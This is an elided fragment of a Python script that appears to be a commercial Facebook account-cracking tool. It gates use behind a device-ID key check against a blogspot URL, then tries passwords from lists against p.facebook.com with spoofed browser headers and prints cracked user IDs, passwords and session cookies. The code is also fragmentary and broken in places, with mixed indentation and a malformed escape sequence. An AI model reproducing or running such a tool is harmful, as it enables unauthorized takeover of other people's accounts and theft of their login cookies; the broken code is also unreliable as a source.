...
def getKey():
    myid = subprocess.check_output("getprop ro.boot.uniqueno",shell=True).decode().replace("\n","")
    k="KA"+myid.upper()+"MI"
    return k


def aprv():
    #add your approval url here
    u="https://kamii911.blogspot.com/2023/01/approvaltxt.html"
    ...
    if k in r:
        ...
        os.system("clear")
        print(f" Your Key:\n {k}")
        print("\033[1;36m Buy the command First")
aprv()
exit()
def fia():    
			#print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\33[38;5;46m[KAMII-OK] {uid}|{ps}")
                print(f" \ Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\1b[38;5;196m[KAMI-CP] {cid}|{ps}")
		...
		for fikr in passlist:
			...
			head = {'Host': 'p.facebook.com',
			   'method':'GET',
                           ...
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/542.15.6 (KHTML, like Gecko) Version/13.1 Safari/542.15.6',
			...
			if "c_user" in kami:
				...
				if 'y' in pcp:
					# print('\r\r\33[1;31m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
